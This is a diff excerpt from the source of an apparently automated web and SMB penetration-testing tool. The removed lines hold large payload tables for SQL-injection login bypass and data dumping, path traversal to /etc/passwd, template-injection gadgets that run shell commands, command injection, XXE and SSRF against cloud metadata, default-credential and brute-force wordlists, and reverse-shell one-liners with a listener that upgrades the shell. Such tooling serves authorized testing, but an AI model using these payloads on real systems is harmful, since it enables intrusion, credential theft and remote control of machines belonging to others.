-    "admin", "administrator", "login", "dashboard", "api", "uploads", "upload", "images",
-    "assets", "static", "backup", "backups", "config", "includes", "inc", "tmp", "test",
-    "dev", "old", "private", "secret", "data", "db", "sql", "logs", "log", "wp-admin",
-    "wp-content", "phpmyadmin", "server-status", "robots.txt", "sitemap.xml", ".git",
-    ".env", ".htaccess", "web.config", "config.php", "info.php", "phpinfo.php", "index.php",
-]
-_DIRB_EXTS = ["php", "asp", "aspx", "txt", "bak", "zip", "html", "old"]
-_DIRB_DEADLINE = 900          # s — hard wall-clock cap across all targets
-_DIRB_THREADS = 30
-_DIRB_REQ_TIMEOUT = 5
-_DIRB_MAX_WORDS = 20000       # sanity cap on words per target
 _DIRB_SENSITIVE = re.compile(
     r"\.(bak|zip|old|sql|tar|gz|tgz|env|git|svn|conf|config|pem|key)\b"
     r"|/(backup|admin|config|\.git|\.env|\.svn)", re.I)
 
 
-# known high-value exposures: (path, body-signature | None, high-severity?). The signature
-# (bytes regex, matched against the response body) confirms a true positive with near-zero
-# false positives — a soft-404 200 won't carry `[core]`, `PK\x03\x04`, `ref:`, etc.
-_VCS_CHECKS = [
-    (".git/HEAD", rb"ref:\s", True),
-    (".git/config", rb"\[core\]", True),
-    (".git/index", rb"^DIRC", True),
-    (".git/logs/HEAD", rb"[0-9a-f]{40}", True),
-    (".gitignore", None, False),
-    (".svn/entries", None, True),
-    (".svn/wc.db", rb"^SQLite format 3", True),
-    (".hg/requires", None, True),
-    (".bzr/branch-format", None, True),
-    (".env", rb"[A-Z0-9_]{2,}=", True),
-    (".env.bak", rb"[A-Z0-9_]{2,}=", True),
-    (".env.example", rb"[A-Z0-9_]{2,}=", False),
-    ("web.config", rb"(?i)<configuration", True),
-    ("wp-config.php.bak", rb"(?i)db_password|<\?php", True),
-    ("wp-config.php~", rb"(?i)db_password|<\?php", True),
-    (".htpasswd", rb":\$", True),
-    ("docker-compose.yml", rb"(?i)services:|version:", True),
-    ("Dockerfile", rb"(?i)^FROM\s", False),
-    ("application.properties", rb"(?i)password|url=", True),
-    ("settings.py", rb"(?i)SECRET_KEY|DATABASES", True),
-    ("backup.zip", rb"^PK\x03\x04", True),
-    ("backup.tar.gz", rb"^\x1f\x8b", True),
-    ("backup.sql", rb"(?i)insert into|create table|mysql dump", True),
-    ("dump.sql", rb"(?i)insert into|create table", True),
-    ("db.sql", rb"(?i)insert into|create table", True),
-    ("database.sql", rb"(?i)insert into|create table", True),
-    (".DS_Store", rb"Bud1", False),
-]
-# swap/backup copies of source files leak the source itself (creds, logic) → high
-_VCS_SWAP_BASES = ["index.php", "config.php", "wp-config.php", "configuration.php",
-                   "database.php", "settings.py", "app.py", ".env"]
-_VCS_SWAP_FORMS = ["{b}.bak", "{b}~", "{b}.old", "{b}.save", "{b}.swp", ".{b}.swp", "{b}.orig"]
-# archives named after the site, confirmed by their magic bytes where possible
-_VCS_ARCH_EXTS = ["zip", "tar.gz", "tgz", "tar", "rar", "7z", "sql", "bak"]
-_VCS_ARCH_SIG = {"zip": rb"^PK\x03\x04", "tar.gz": rb"^\x1f\x8b", "tgz": rb"^\x1f\x8b",
-                 "tar": None, "rar": rb"^Rar!", "7z": rb"^7z\xbc\xaf",
-                 "sql": rb"(?i)insert into|create table", "bak": None}
 _VCS_HIGH_RE = re.compile(
     r"\.git|\.svn|\.hg|\.bzr|\.env|\.htpasswd|wp-config|web\.config|"
     r"\.sql$|\.(zip|tar\.gz|tgz|tar|rar|7z)$|"
     r"(\.php|\.py)(~|\.(bak|old|save|orig|swp))$|\.swp$", re.I)
-_VCS_DEADLINE = 180
-_VCS_THREADS = 20
-_VCS_REQ_TIMEOUT = 5
-
-
-# parameter-name wordlists, best first (multi-path entries merged); builtin fallback below.
-_PARAM_WORDLISTS = [
-    ("seclists burp-parameter-names", ["/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"]),
-    ("arjun params", ["/usr/share/arjun/db/params.txt",
-                      "/usr/lib/python3/dist-packages/arjun/db/large.txt"]),
-    ("seclists raft-medium-words", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"]),
-]
-_PARAM_BUILTIN = [   # ~120 high-value parameter names
-    "id", "page", "file", "path", "dir", "folder", "include", "inc", "template", "tpl",
-    "doc", "document", "load", "read", "source", "src", "download", "url", "uri", "link",
-    "redirect", "next", "return", "returnurl", "dest", "destination", "domain", "callback",
-    "site", "feed", "host", "cmd", "exec", "command", "run", "ping", "system", "query",
-    "q", "search", "s", "keyword", "user", "username", "uid", "userid", "account", "profile",
-    "role", "admin", "debug", "test", "dev", "view", "action", "act", "do", "func", "module",
-    "type", "cat", "category", "item", "product", "pid", "name", "email", "token", "key",
-    "api_key", "apikey", "auth", "session", "lang", "language", "locale", "format", "output",
-    "order", "sort", "field", "column", "table", "db", "data", "value", "val", "content",
-    "text", "message", "msg", "code", "status", "state", "mode", "step", "start", "end",
-    "limit", "offset", "count", "num", "size", "width", "height", "img", "image", "photo",
-    "avatar", "upload", "filename", "filepath", "target", "ref", "referer", "from", "to",
-    "date", "time", "year", "month", "day", "flag", "enable", "disable", "show", "hide",
-]
 _PARAM_DANGEROUS = {
     "file", "path", "dir", "folder", "include", "inc", "page", "template", "tpl", "doc",
     "document", "load", "read", "source", "src", "download", "url", "uri", "link",
@@ -5369,313 +5219,6 @@ _PARAM_DANGEROUS = {
     "userid", "user", "account", "profile", "role", "admin", "debug", "view", "action",
     "do", "func", "module", "filepath", "filename", "target",
 }
-_PARAM_STATIC_RE = re.compile(
-    r"\.(js|css|png|jpe?g|gif|ico|svg|woff2?|ttf|eot|pdf|zip|map|mp4|webp|json)(\?|$)", re.I)
-_PARAM_DYNAMIC_RE = re.compile(r"\.(php|asp|aspx|jsp|jspx|cgi|pl|py|do|action)(\?|$)", re.I)
-_PARAM_DEADLINE = 600
-_PARAM_THREADS = 30
-_PARAM_REQ_TIMEOUT = 5
-_PARAM_MAX_ENDPOINTS = 12
-_PARAM_MAX_WORDS = 5000
-
-
-# a SMALL curated set of product defaults — this is the default-creds check, NOT a
-# brute-force (that is a separate, gated step). Kept short so it never trips a lockout.
-_CREDS_DEFAULT = [
-    ("admin", "admin"), ("admin", "password"), ("admin", ""), ("admin", "admin123"),
-    ("admin", "changeme"), ("admin", "1234"), ("admin", "12345"), ("admin", "default"),
-    ("administrator", "password"), ("administrator", "administrator"),
-    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", ""),
-    ("user", "user"), ("test", "test"), ("guest", "guest"), ("guest", ""),
-    ("sa", ""), ("operator", "operator"),
-]
-# product → (extra creds, extra login paths), matched against detected service/product/cpe
-_CREDS_PRODUCT = {
-    "tomcat":     ([("tomcat", "tomcat"), ("admin", "tomcat"), ("manager", "manager"),
-                    ("tomcat", "s3cret")], ["/manager/html", "/host-manager/html"]),
-    "jenkins":    ([("admin", "admin"), ("admin", "password")], ["/login"]),
-    "grafana":    ([("admin", "admin")], ["/login"]),
-    "phpmyadmin": ([("root", ""), ("root", "root"), ("root", "password")], ["/index.php"]),
-    "gitlab":     ([("root", "5iveL!fe"), ("admin", "password")], ["/users/sign_in"]),
-    "wordpress":  ([("admin", "admin"), ("admin", "password")], ["/wp-login.php"]),
-    "kibana":     ([("elastic", "changeme")], ["/login"]),
-    "zabbix":     ([("Admin", "zabbix")], ["/index.php"]),
-}
-_CREDS_PATH_RE = re.compile(
-    r"admin|login|signin|sign-in|manager|portal|panel|console|auth|wp-login|phpmyadmin", re.I)
-_CREDS_FALLBACK_PATHS = ["/admin", "/login", "/login.php", "/administrator", "/wp-login.php",
-                         "/manager/html", "/phpmyadmin/", "/admin/login", "/user/login"]
-_CREDS_ERR_RE = re.compile(
-    r"invalid|incorrect|failed|wrong|denied|try again|bad (?:user|pass)|not (?:found|match)", re.I)
-_CREDS_OK_RE = re.compile(
-    r"logout|log out|sign out|dashboard|welcome|my account|successfully|control panel", re.I)
-_CREDS_DEADLINE = 180
-_CREDS_THREADS = 8
-_CREDS_REQ_TIMEOUT = 5
-_CREDS_MAX_TARGETS = 24
-
-
-# non-destructive SQLi auth-bypass payloads (login logic only — no DROP/DELETE): (user, pass)
-_SQLI_BYPASS = [
-    ("' OR '1'='1' -- -", ""), ("' OR 1=1 -- -", ""), ("' OR 1=1#", ""),
-    ("admin' -- -", ""), ("admin'#", ""), ('" OR "1"="1" -- -', ""),
-    ('") OR ("1"="1" -- -', ""), ("' OR 'x'='x", ""), ("' OR ''='", ""),
-    ("admin", "' OR '1'='1"), ("admin", "' OR 1=1 -- -"),
-]
-_SQL_ERROR_RE = re.compile(
-    r"you have an error in your sql syntax|warning:\s*mysqli?_|unclosed quotation mark|"
-    r"quoted string not properly terminated|ORA-\d{5}|PostgreSQL.*?ERROR|SQLSTATE\[|"
-    r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|System\.Data\.SqlClient|"
-    r"ODBC SQL Server Driver|mysql_fetch|supplied argument is not a valid MySQL", re.I)
-_AUTHB_DEADLINE = 180
-_AUTHB_THREADS = 8
-_AUTHB_REQ_TIMEOUT = 5
-_AUTHB_MAX_TARGETS = 16
-
-
-_BRUTE_USER_WORDLISTS = [
-    ("seclists top-usernames", ["/usr/share/seclists/Usernames/top-usernames-shortlist.txt"]),
-    ("seclists names", ["/usr/share/seclists/Usernames/Names/names.txt"]),
-]
-_BRUTE_USER_BUILTIN = ["admin", "administrator", "root", "user", "test", "guest", "operator",
-                       "manager", "support", "webadmin", "sysadmin", "tomcat", "oracle",
-                       "postgres", "info", "demo", "staff", "service", "backup"]
-_BRUTE_PASS_WORDLISTS = [
-    ("seclists top-500",
-     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt"]),
-    ("seclists top-100",
-     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"]),
-    ("seclists probable-1575", ["/usr/share/seclists/Passwords/probable-v2-top-1575.txt"]),
-    ("rockyou", ["/usr/share/wordlists/rockyou.txt"]),
-]
-_BRUTE_PASS_BUILTIN = [
-    "password", "123456", "123456789", "12345678", "12345", "1234", "admin", "Password1",
-    "P@ssw0rd", "password1", "welcome", "welcome1", "changeme", "letmein", "qwerty", "root",
-    "toor", "abc123", "admin123", "password123", "iloveyou", "monkey", "dragon", "111111",
-    "sunshine", "princess", "football", "secret", "master", "superman", "hello", "login",
-    "passw0rd", "test", "guest", "default", "administrator", "qwerty123", "1q2w3e4r",
-    "654321", "123321", "000000", "qazwsx", "trustno1", "1234567", "zaq12wsx", "pass",
-]
-_BRUTE_LOCKOUT_RE = re.compile(
-    r"locked|too many|try again later|temporarily (?:disabled|blocked)|rate.?limit|"
-    r"account.*(?:disabled|suspended|blocked)|exceeded|throttl", re.I)
-_BRUTE_DEADLINE = 600
-_BRUTE_THREADS = 4
-_BRUTE_REQ_TIMEOUT = 5
-_BRUTE_MAX_PASS = 200
-_BRUTE_PER_USER_CAP = 100
-_BRUTE_USER_ENUM_CAP = 40
-_BRUTE_LOCKOUT_PROBE = 5
-_BRUTE_MAX_TARGETS = 8
-
-
-# non-destructive SQLi detection payloads (SELECT/AND/SLEEP only — never DROP/DELETE/UPDATE)
-_SQLI_ERR_PAYLOADS = ["'", "\"", "')", "\\"]
-_SQLI_DBMS_SIG = [
-    ("mysql", r"you have an error in your sql syntax|warning:\s*mysqli?_|MySQL server version|valid MySQL"),
-    ("postgresql", r"PostgreSQL.*?ERROR|pg_query|unterminated quoted string"),
-    ("mssql", r"SQL Server|System\.Data\.SqlClient|unclosed quotation mark|ODBC SQL Server"),
-    ("oracle", r"ORA-\d{5}|quoted string not properly terminated"),
-    ("sqlite", r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|syntax error"),
-]
-_SQLI_BOOL = [
-    ("' AND '1'='1", "' AND '1'='2"),
-    ('" AND "1"="1', '" AND "1"="2'),
-    (" AND 1=1", " AND 1=2"),
-    (" AND 1=1-- -", " AND 1=2-- -"),
-]
-_SQLI_TIME = [   # (dbms, sleep-5 template, control template)
-    ("mysql", "' AND SLEEP({n})-- -", "' AND SLEEP(0)-- -"),
-    ("mysql", '" AND SLEEP({n})-- -', '" AND SLEEP(0)-- -'),
-    ("mysql", " AND SLEEP({n})", " AND SLEEP(0)"),
-    ("postgresql", "' AND {n}=(SELECT {n} FROM PG_SLEEP({n}))-- -", "' AND 0=(SELECT 0)-- -"),
-    ("mssql", "'; WAITFOR DELAY '0:0:{n}'-- -", "'; WAITFOR DELAY '0:0:0'-- -"),
-]
-_SQLI_DEADLINE = 300
-_SQLI_THREADS = 6
-_SQLI_REQ_TIMEOUT = 10
-_SQLI_TIME_DELAY = 5
-_SQLI_MAX_PARAMS = 30
-_SQLI_MAX_TIME_PARAMS = 12
-_SQLI_MAX_SQLMAP = 3
-_SQLI_SQLMAP_TIMEOUT = 180
-
-
-# OSCP-safe SQLi engine (no sqlmap / no external tool): breakout contexts, MySQL-first.
-_SQLI_CTX = [("num", "1 "), ("sq", "1' "), ("dq", '1" '), ("sqp", "1') "), ("dqp", '1") ')]
-_SQLI_DUMP_ERR = re.compile(
-    r"SQL syntax|Unknown column|mysql_|valid MySQL|ORA-\d{5}|PostgreSQL|SQL Server|"
-    r"sqlite|Warning|error in your|supplied argument|Query failed", re.I)
-_SQLI_INTERESTING_TBL = re.compile(
-    r"user|admin|account|member|login|credential|pass|auth|customer|staff|employee|flag|"
-    r"secret|config|setting|session|token|key|private|cred", re.I)
-_SQLI_INTERESTING_COL = re.compile(
-    r"user|name|email|login|pass|pwd|hash|secret|token|key|role|admin|flag", re.I)
-_SQLI_DUMP_MAX_TARGETS = 8
-_SQLI_DUMP_MAX_COLS = 12
-_SQLI_DUMP_ROWS = 15
-_SQLI_DUMP_TABLES = 6
-_SQLI_DUMP_DEADLINE = 300
-_SQLI_DUMP_BLIND_MAXLEN = 64
-
-
-# LFI / path traversal — file-like param names, read-only payloads, content-verified.
-_LFI_FILE_PARAM = re.compile(
-    r"file|page|path|include|inc|template|tpl|doc|document|view|lang|dir|load|read|"
-    r"download|content|src|url|cat", re.I)
-_LFI_PASSWD = ["/etc/passwd"] + ["../" * d + "etc/passwd" for d in range(1, 9)] + [
-    "....//" * 6 + "etc/passwd",
-    "..%2f" * 6 + "etc%2fpasswd",
-    "..%252f" * 6 + "etc%252fpasswd",
-    "/etc/passwd%00", "../" * 6 + "etc/passwd%00",
-    "php://filter/resource=/etc/passwd",
-]
-_LFI_WIN = ["..\\" * 6 + "windows\\win.ini", "..%5c" * 6 + "windows%5cwin.ini",
-            "C:\\windows\\win.ini"]
-_LFI_ENVIRON = ["/proc/self/environ", "../" * 6 + "proc/self/environ"]
-_LFI_PHPSRC = ["php://filter/convert.base64-encode/resource=index.php",
-               "php://filter/read=convert.base64-encode/resource=index.php",
-               "php://filter/convert.base64-encode/resource=index"]
-_LFI_SIG_PASSWD = re.compile(r"^[a-zA-Z_][\w.-]*:[^:\n]*:\d+:\d+:", re.M)
-_LFI_SIG_WIN = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I)
-_LFI_SIG_ENVIRON = re.compile(r"PATH=|HTTP_HOST=|DOCUMENT_ROOT=|SERVER_SOFTWARE=")
-_LFI_DEADLINE = 180
-_LFI_THREADS = 8
-_LFI_MAX_PARAMS = 20
-
-
-_RFI_DEADLINE = 120
-_RFI_THREADS = 8
-_RFI_MAX_PARAMS = 20
-
-
-# OS command injection — params that often reach a shell, tested first.
-_CMDI_SUSPECT = re.compile(
-    r"host|ip|ping|cmd|exec|dns|domain|url|file|name|query|target|addr|command|run|"
-    r"search|lookup|nslookup|trace|port", re.I)
-_CMDI_DEADLINE = 240
-_CMDI_THREADS = 6
-_CMDI_REQ_TIMEOUT = 10
-_CMDI_TIME_DELAY = 5
-_CMDI_MAX_PARAMS = 20
-_CMDI_MAX_TIME_PARAMS = 10
-
-
-# command-injection separators, shared by cmdi-scan (detection) and foothold (which rebuilds
-# the exact wrapper from the label cmdi-scan recorded in the DB). CMD is spliced into the value.
-_CMDI_WRAPS = [
-    ("; ", lambda c: f"1;{c}"),
-    ("| ", lambda c: f"1|{c}"),
-    ("&& ", lambda c: f"1&&{c}"),
-    ("$(...)", lambda c: f"1$({c})"),
-    ("`...`", lambda c: f"1`{c}`"),
-    ("newline", lambda c: f"1\n{c}"),
-]
-_CMDI_TIME_WRAPS = [
-    ("; sleep", lambda n: f"1;sleep {n}"),
-    ("| sleep", lambda n: f"1|sleep {n}"),
-    ("&& sleep", lambda n: f"1&&sleep {n}"),
-    ("$(sleep)", lambda n: f"1$(sleep {n})"),
-    ("`sleep`", lambda n: f"1`sleep {n}`"),
-    ("& ping(win)", lambda n: f"1&ping -n {n + 1} 127.0.0.1"),
-]
-
-
-# SSTI: template syntaxes for the math probe, then per-family RCE gadgets (run a command).
-_SSTI_SYNTAX = [
-    ("{{ }}", lambda e: "{{" + e + "}}"),
-    ("${ }", lambda e: "${" + e + "}"),
-    ("#{ }", lambda e: "#{" + e + "}"),
-    ("<%= %>", lambda e: "<%= " + e + " %>"),
-    ("{ }", lambda e: "{" + e + "}"),
-    ("@( )", lambda e: "@(" + e + ")"),
-]
-# family -> [(engine, gadget(cmd) -> payload)] — gadgets run a shell command via the engine
-_SSTI_GADGETS = {
-    "{{ }}": [
-        ("Jinja2", lambda c: "{{cycler.__init__.__globals__.os.popen('" + c + "').read()}}"),
-        ("Jinja2", lambda c: "{{lipsum.__globals__.os.popen('" + c + "').read()}}"),
-        ("Twig", lambda c: "{{['" + c + "']|filter('system')}}"),
-        ("Nunjucks", lambda c: "{{range.constructor(\"return global.process.mainModule."
-                               "require('child_process').execSync('" + c + "')\")()}}"),
-    ],
-    "${ }": [
-        ("Freemarker", lambda c: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + c + '")}'),
-        ("Mako", lambda c: "${__import__('os').popen('" + c + "').read()}"),
-        ("Smarty", lambda c: "${system('" + c + "')}"),
-    ],
-    "<%= %>": [
-        ("ERB", lambda c: "<%= `" + c + "` %>"),
-        ("ERB", lambda c: "<%= IO.popen('" + c + "').read %>"),
-    ],
-    "{ }": [
-        ("Smarty", lambda c: "{system('" + c + "')}"),
-        ("Smarty", lambda c: "{php}system('" + c + "');{/php}"),
-    ],
-}
-_SSTI_DEADLINE = 150
-_SSTI_THREADS = 8
-_SSTI_MAX_PARAMS = 20
-
-
-# ── HTTP step 21: file-upload → webshell (PHP only; exec-verified, non-destructive) ──
-_UPLOAD_DEADLINE = 300          # s — hard wall-clock cap over all forms/variants
-_UPLOAD_REQ_TIMEOUT = 10
-_UPLOAD_MAX_FORMS = 12          # distinct upload surfaces to probe
-_UPLOAD_PATH_RE = re.compile(
-    r"upload|avatar|profile|import|attach|media|photo|gallery|file", re.I)
-# common upload endpoints to try when nothing was mined by earlier steps (per host + vhost)
-_UPLOAD_FALLBACK_PATHS = [
-    "/upload", "/upload.php", "/uploads", "/admin/upload", "/admin/upload.php",
-    "/profile", "/profile.php", "/account", "/avatar", "/avatar.php",
-    "/import", "/import.php", "/file", "/files", "/attachment", "/attachments",
-    "/media", "/gallery", "/photo", "/settings",
-]
-# where a stored file is commonly reachable from, checked when the response doesn't leak a URL
-_UPLOAD_STORE_DIRS = [
-    "/uploads/", "/upload/", "/files/", "/file/", "/images/", "/img/", "/media/",
-    "/avatars/", "/avatar/", "/attachments/", "/userfiles/", "/data/", "/assets/",
-    "/content/", "/tmp/", "/",
-]
-
-
-# ── HTTP step 22: XXE & SSRF (read-only, in-band + out-of-band) ──
-_XXES_DEADLINE = 300
-_XXES_REQ_TIMEOUT = 8
-_XXES_OOB_WAIT = 6              # s — one window after firing all blind probes of a phase
-_XXES_MAX_TARGETS = 24         # per phase (SSRF combos / XML endpoints)
-# query-param names that plausibly drive a server-side fetch (SSRF)
-_SSRF_PARAMS = {
-    "url", "uri", "link", "redirect", "redirect_url", "redirecturl", "next", "dest",
-    "destination", "domain", "callback", "feed", "host", "target", "img", "image",
-    "imageurl", "load", "src", "source", "proxy", "fetch", "webhook", "u", "page",
-    "continue", "return", "returnurl", "out", "view", "site", "reference", "ref", "path",
-}
-_SSRF_CORE = ["url", "uri", "link", "redirect", "next", "dest", "image", "load",
-              "feed", "callback", "target", "proxy"]      # injected on discovered endpoints
-# cloud metadata endpoints: (label, url, markers that only appear in a real metadata response)
-_SSRF_META = [
-    ("aws",   "http://169.254.169.254/latest/meta-data/",
-     ("ami-id", "instance-id", "security-credentials", "public-keys", "iam/")),
-    ("gcp",   "http://metadata.google.internal/computeMetadata/v1/",
-     ("computeMetadata", "project/", "instance/")),
-    ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-     ("azEnvironment", "vmId", "\"compute\"")),
-]
-# endpoints that classically parse XML / SOAP — POST an XML body here
-_XXE_XML_PATHS = ["/xmlrpc.php", "/api", "/api/xml", "/soap", "/services", "/ws",
-                  "/rest", "/rpc", "/graphql", "/feed", "/rss"]
-# in-band XXE file-read probes: (xml body, detector regex, label)
-_XXE_READ = [
-    ('<?xml version="1.0" encoding="UTF-8"?>\n'
-     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>',
-     re.compile(r"root:.*?:0:0:"), "file:///etc/passwd"),
-    ('<?xml version="1.0" encoding="UTF-8"?>\n'
-     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n<r>&xxe;</r>',
-     re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I), "file:///c:/windows/win.ini"),
-]
-
-
 class _OOBCatcher:
     """Short-lived HTTP catcher for blind XXE / SSRF confirmation: binds an ephemeral port on
     every interface, hands out marker URLs, and records which markers the target actually
@@ -5751,215 +5294,6 @@ class _OOBCatcher:
             pass
 
 
-# ── HTTP step 23: IDOR / broken access control (read-only, unauth + optional creds) ──
-_IDOR_DEADLINE = 240
-_IDOR_REQ_TIMEOUT = 8
-_IDOR_MAX_ENDPOINTS = 20        # ID-bearing endpoints to enumerate
-_IDOR_MAX_PRIV = 24            # privileged paths to force-browse / bypass
-_IDOR_ID_PARAMS = {
-    "id", "uid", "user", "userid", "user_id", "account", "acct", "order", "orderid",
-    "doc", "docid", "document", "file", "fileid", "invoice", "pid", "record", "rid",
-    "num", "no", "key", "ref", "item", "ticket", "pk", "msg", "message",
-}
-_PRIV_PATH_RE = re.compile(
-    r"admin|dashboard|manage|console|users?|account|api|internal|config|report|billing|"
-    r"invoice|setting|profile|panel|staff|moderator", re.I)
-_PRIV_CONTENT_RE = re.compile(
-    r"logout|log ?out|dashboard|administration|manage users|delete\b|\brole\b|privilege|"
-    r"add user|user list|<table|control panel|settings", re.I)
-_PII_RE = re.compile(
-    r"[\w.+-]+@[\w-]+\.[\w.-]+|"                              # email
-    r"[\"']?(?:user_?name|email|first_?name|last_?name|phone|address|ssn|balance|role|"
-    r"is_?admin|api[_-]?key|token|password)[\"']?\s*[:=]", re.I)
-_IDOR_FALLBACK = ["/user/1", "/users/1", "/api/users/1", "/api/user/1", "/account/1",
-                  "/accounts/1", "/profile/1", "/order/1", "/orders/1", "/invoice/1",
-                  "/api/v1/users/1", "/?id=1"]
-_PRIV_FALLBACK = ["/admin", "/admin/users", "/administrator", "/dashboard", "/manage",
-                  "/management", "/settings", "/config", "/api/users", "/api/admin",
-                  "/users", "/staff", "/panel", "/console"]
-
-
-# ── HTTP step 24: CMS-specific scan (wpscan / droopescan orchestrator + stdlib fallback) ──
-_CMS_DEADLINE = 300
-_CMS_REQ_TIMEOUT = 10
-_CMS_SCAN_TIMEOUT = 240        # per external scanner
-_CMS_MAX_PLUGINS = 25
-_WP_TOP_PLUGINS = [
-    "akismet", "contact-form-7", "woocommerce", "elementor", "wordpress-seo", "jetpack",
-    "wpforms-lite", "wordfence", "all-in-one-seo-pack", "wp-super-cache", "w3-total-cache",
-    "really-simple-ssl", "updraftplus", "classic-editor", "mailchimp-for-wp", "redirection",
-    "google-site-kit", "ninja-forms", "advanced-custom-fields", "wp-file-manager",
-    "ithemes-security", "backwpup", "duplicate-post", "loginizer", "revslider",
-]
-
-
-# ── HTTP step 25: Admin panel → RCE (WordPress; creds-gated, inert, reversible) ──
-_ADMINRCE_DEADLINE = 200
-_ADMINRCE_REQ_TIMEOUT = 12
-
-
-# ── HTTP step 26: foothold — spawn & auto-upgrade a reverse shell via a confirmed RCE channel ──
-_FOOTHOLD_ENUM_TOOLS = ["python3", "python", "socat", "nc", "ncat", "perl", "php", "ruby", "bash",
-                        "script"]
-# (label, interpreter it needs, reverse-shell payload with {ip}/{port}, already-interactive-pty?)
-_REVSHELLS = [
-    ("python3 pty", "python3",
-     "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
-     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
-    ("python pty", "python",
-     "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
-     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
-    ("socat pty", "socat",
-     "socat tcp:{ip}:{port} exec:'bash -li',pty,stderr,setsid,sigint,sane", True),
-    ("bash /dev/tcp", "bash", "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", False),
-    ("nc -e", "nc", "nc {ip} {port} -e /bin/bash", False),
-    ("nc mkfifo", "nc",
-     "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f", False),
-    ("perl", "perl",
-     "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
-     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");"
-     "open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'", False),
-    ("php", "php",
-     "php -r '$s=fsockopen(\"{ip}\",{port});proc_open(\"/bin/bash -i\","
-     "array(0=>$s,1=>$s,2=>$s),$p);'", False),
-    ("ruby", "ruby",
-     "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
-     "exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'", False),
-]
-# self-selecting TTY upgrade sent to a dumb shell on connect: python3 → python → script → bash
-_FOOTHOLD_UPGRADE = (
-    "(command -v python3>/dev/null&&exec python3 -c 'import pty;pty.spawn(\"/bin/bash\")');"
-    "(command -v python>/dev/null&&exec python -c 'import pty;pty.spawn(\"/bin/bash\")');"
-    "(command -v script>/dev/null&&exec script -qc /bin/bash /dev/null);exec /bin/bash\n")
-
-_SMART_LISTENER_SRC = r'''
-import socket, sys, os, select, time
-LPORT = __LPORT__
-UPGRADE = __UPGRADE__
-srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-srv.bind(("0.0.0.0", LPORT)); srv.listen(1)
-sys.stdout.write("[*] pshunter listener on 0.0.0.0:%d - waiting for the target...\n" % LPORT)
-sys.stdout.flush()
-conn, addr = srv.accept()
-sys.stdout.write("[+] shell from %s:%d\n" % addr); sys.stdout.flush()
-try:
-    cols, rows = os.get_terminal_size()
-except Exception:
-    cols, rows = 120, 30
-if UPGRADE:
-    conn.sendall(UPGRADE); time.sleep(0.6)
-conn.sendall(("stty rows %d cols %d 2>/dev/null; export TERM=xterm-256color; "
-              "export SHELL=/bin/bash\n" % (rows, cols)).encode())
-old = None
-try:
-    import termios, tty
-    old = termios.tcgetattr(0); tty.setraw(0)
-except Exception:
-    pass
-try:
-    while True:
-        r, _, _ = select.select([0, conn], [], [])
-        if 0 in r:
-            d = os.read(0, 1024)
-            if not d:
-                break
-            conn.sendall(d)
-        if conn in r:
-            d = conn.recv(4096)
-            if not d:
-                break
-            os.write(1, d)
-finally:
-    if old is not None:
-        try:
-            termios.tcsetattr(0, termios.TCSADRAIN, old)
-        except Exception:
-            pass
-    conn.close()
-sys.stdout.write("\n[*] session closed - press enter to close this tab\n")
-try:
-    input()
-except Exception:
-    pass
-'''
-
-
-# ── HTTP step 27: manual next steps — a context-aware "when stuck" playbook (list only) ──
-# ── SMB step 1+2: unauthenticated enumeration ─────────────────────────────────
-_SMBENUM_DEADLINE = 240          # s — hard wall-clock cap across every external call
-_SMB_ANSI = re.compile(r"\x1b\[[0-9;]*m")
-
-
-# ── SMB step 2: version-RCE vulnerability scan (DETECTION ONLY) ────────────────
-_SMBVULN_DEADLINE = 300          # s — hard wall-clock cap across every external call
-# (nmap script, canonical (label, CVE)) — CVE strings kept in the report so the generic
-# CVE harvester + KEV tagging pick them up automatically.
-_SMBVULN_NMAP = {
-    "smb-vuln-ms17-010":            ("MS17-010 EternalBlue", "CVE-2017-0143"),
-    "smb-vuln-ms08-067":            ("MS08-067", "CVE-2008-4250"),
-    "smb-double-pulsar-backdoor":   ("DoublePulsar implant (host already compromised)", None),
-}
-
-
-# ── SMB step 3: share looting (read-only, in-memory grep) ─────────────────────
-_SMBLOOT_DEADLINE = 360          # s — hard wall-clock cap
-_SMBLOOT_MAX_FILE = 5_000_000    # per-file download ceiling (bytes)
-_SMBLOOT_MAX_FILES = 120         # how many interesting files to fetch+grep
-_SMBLOOT_MAX_TOTAL = 100_000_000  # total bytes fetched
-# filenames / extensions worth reading — configs, secrets, keys, backups, scripts
-_SMB_LOOT_RE = re.compile(
-    r"(?i)(groups\.xml|unattend\.xml|sysprep\.(?:inf|xml)|web\.config|autologin|"
-    r"\.(?:config|xml|ps1|psd1|bat|cmd|vbs|ini|conf|cnf|env|ya?ml|json|sql|bak|old|kdbx|"
